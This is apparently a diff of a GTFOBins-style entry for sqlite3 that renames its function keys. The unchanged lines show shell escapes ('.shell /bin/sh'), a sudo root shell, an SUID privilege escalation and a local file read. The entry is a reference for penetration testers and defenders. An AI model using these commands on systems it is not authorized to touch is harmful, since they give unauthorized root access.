@@ -1,6 +1,6 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: sqlite3 /dev/null '.shell /bin/sh'
   file-write:
     - code: |
@@ -14,8 +14,8 @@ functions:
         .import $LFILE t
         SELECT * FROM t;
         EOF
-  sudo-enabled:
+  sudo:
     - code: sudo sqlite3 /dev/null '.shell /bin/sh'
-  suid-limited:
+  limited-suid:
     - code: "./sqlite3 /dev/null '.shell /bin/sh'"
 ---
